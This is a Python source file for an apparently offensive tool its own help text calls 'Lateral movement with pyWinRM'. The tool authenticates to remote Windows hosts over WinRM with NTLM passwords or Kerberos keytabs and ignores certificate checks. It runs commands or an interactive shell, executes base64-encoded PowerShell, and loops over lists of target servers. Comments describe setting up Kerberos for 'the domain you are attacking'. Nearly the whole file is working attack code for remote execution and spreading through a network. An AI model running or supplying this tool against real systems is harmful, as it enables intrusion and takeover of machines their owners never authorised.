import argparse
import logging
import configparser
from time import gmtime
from getpass import getpass
from winrm.protocol import Protocol
from winrm.exceptions import InvalidCredentialsError
from requests.exceptions import ConnectionError
from base64 import b64encode
# import readline before calling input() to allow backspace to work
import readline

def read_config(filename):
    # read config from a file
    try:
        config = configparser.ConfigParser()
        # config.read('config.ini')
        config.read(filename)
        endpoint = config.get('winrm', 'endpoint')
        username = config.get('winrm', 'username')
        password = config.get('winrm', 'password')
    except Exception as e:
        logging.exception('Error occurred')
        exit(1)

# base64 encodes a Powershell script
def run_ps(script):
    # must use utf16 little endian on windows
    encoded_ps = b64encode(script.encode('utf_16_le')).decode('ascii')
    return encoded_ps

# kerb auth external config (needs to be initialized outside python script):
# modify /etc/krb5.conf and set default_realm to FQDN of domain you are
# attacking
# modify /etc/hosts to include correct IP to hostname mapping
# finally, export KRB5CCNAME=kerbtix
def exploit(endpoint, username, password, command, transport, keytab):
    p = Protocol(
        endpoint = f'https://{endpoint}:5986/wsman',
        transport = transport,
        # for kerb auth, username should be uppercase eg: USERNAME@FQDN
        # username = r'fqdn\username',
        username = username.upper(),
        # for kerb auth, password should be None
        password = password,
        # for ntlm auth, keytab should be None
        # absolute/relative paths are both fine
        keytab = keytab,
        server_cert_validation='ignore')

    logging.info(f'Opening shell on {endpoint} using {transport} authentication')

    try:
        shell_id = p.open_shell()
    except InvalidCredentialsError as e:
        logging.exception(f'Error occurred: Check credentials/privileges on {endpoint}')
        return
    except ConnectionError as e:
        logging.exception(f'Error occurred: Unable to reach/resolve {endpoint}')
        return
    except Exception as e:
        logging.exception('Error occurred')
        return

    # TODO: make interactive_flag hack more elegant?
    # very shitty hack to make interactive code execution work
    if interactive_flag:
        logging.info('[!] Interactive prompt detected')
        logging.info('[!] Launching semi-interactive shell - Careful what you execute!')
        logging.info('[!] Use Ctrl-C to exit')
        try:
            while True:
                # accept user input as command to execute on remote server
                command = input('> ')

                # shitty hack to run powershell scripts
                # TODO: converts a Powershell CLIXML message to a more human readable string
                if powershell_flag:
                    encoded_ps = run_ps(command)
                    command = f'powershell -encodedcommand {encoded_ps}'

                command_id = p.run_command(shell_id, command)
                std_out, std_err, status_code = p.get_command_output(shell_id, command_id)

                if status_code == 0:
                    logging.info(std_out.decode('utf-8'))
                else:
                    logging.error(std_err.decode('utf-8'))
        except KeyboardInterrupt:
            logging.info('Ctrl-C detected! Terminating interactive shell')
            p.cleanup_command(shell_id, command_id)
            p.close_shell(shell_id)
            return

    # shitty hack to run powershell scripts
    if powershell_flag:
        encoded_ps = run_ps(command)
        command = f'powershell -encodedcommand {encoded_ps}'

    # command_id = p.run_command(shell_id, 'ipconfig', ['/all'])
    logging.info(f'Executing "{command}" on {endpoint}')
    # command_id = p.run_command(shell_id, 'ipconfig /all')
    command_id = p.run_command(shell_id, command)
    std_out, std_err, status_code = p.get_command_output(shell_id, command_id)
    p.cleanup_command(shell_id, command_id)
    p.close_shell(shell_id)

    if status_code == 0:
        logging.info(std_out.decode('utf-8'))
    else:
        logging.error(std_err.decode('utf-8'))

def main():
    # command line args
    parser = argparse.ArgumentParser(description='Lateral movement with pyWinRM')
    parser.add_argument_group()
    # parser.add_argument('config', help='Config file to read')
    parser.add_argument('-o', '--output', dest='filename_prepend', default='wunderthunder_', help='Prepend a string to all output file names')
    parser.add_argument('-ps', '--powershell', action='store_true', help='Run powershell commands on remote server')

    # hack to make optional args "required"
    server_group = parser.add_argument_group(title='Server parameters')
    server_group.add_argument('-u', '--username', help='Username to authenticate with in USERNAME@DOMAIN format', required=True)
    # server_group.add_argument('-c', '--command', help='Command to run against winrm endpoint', required=True)
    server_group.add_argument('-t', '--transport', help='Transport type, either ntlm/kerberos', required=True)

    # TODO: make command/interactive mutually exclusive
    execution = parser.add_mutually_exclusive_group(required=True)
    execution.add_argument('-c', '--command', help='Command to run against winrm endpoint')
    execution.add_argument('-i', '--interactive', action='store_true', help='Open an interactive shell on remote server')

    # auth type (ntlm/kerb) is mutually exclusive
    method = parser.add_mutually_exclusive_group(required=True)
    method.add_argument('-p', '--password', help='Password to authenticate with')
    method.add_argument('-P', '--prompt', dest='password_prompt', action='store_true', help='Prompt for the password')
    method.add_argument('-k', '--keytab', help='Absolute/relative path to a keytab file (required if "--transport kerberos")')

    # -l/-lf is mutually exclusive
    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument('-l', '--server', help='FQDN of server to run commands on')
    target.add_argument('-lf', '--serverList', help='File containing FQDN of server(s) to run commands on separated by newline')

    # parse args
    args = parser.parse_args()

    # read_config(args.config)

    # if --prompt then overwrite args.password now
    if args.password_prompt is True or (not args.password and not args.keytab):
        args.password = getpass()

    # logger config
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s %(levelname)-8s %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S',
                        filename=args.filename_prepend + 'Log.txt',
                        filemode='a')
    # force UTC
    logging.Formatter.converter = gmtime

    # define a Handler which writes INFO messages or higher to the sys.stderr
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    # set a format which is simpler for console use
    # formatter = logging.Formatter('%(asctime)s: %(levelname)-8s %(message)s')
    formatter = logging.Formatter('%(levelname)-8s %(message)s')
    # tell the handler to use this format
    console.setFormatter(formatter)
    # add the handler to the root logger
    logging.getLogger().addHandler(console)

    logging.info(f'Writing logs to "{args.filename_prepend}Log.txt"')

    # TODO: add interactive prompt
    global interactive_flag
    if args.interactive:
        # hack to make interactive prompt work with minimal breaking changes
        interactive_flag = True
    else:
        interactive_flag = False

     # TODO: add powershell
    global powershell_flag
    if args.powershell:
        # hack to make interactive prompt work with minimal breaking changes
        powershell_flag = True
    else:
        powershell_flag = False

    if args.server:
        exploit(args.server, args.username, args.password, args.command, args.transport, args.keytab)
    elif args.serverList:
        with open(args.serverList) as f:
            for server in f.readlines():
                exploit(server.rstrip(), args.username, args.password, args.command, args.transport, args.keytab)

    logging.info('Program execution complete. Exiting!')

if __name__ == "__main__":
    main()

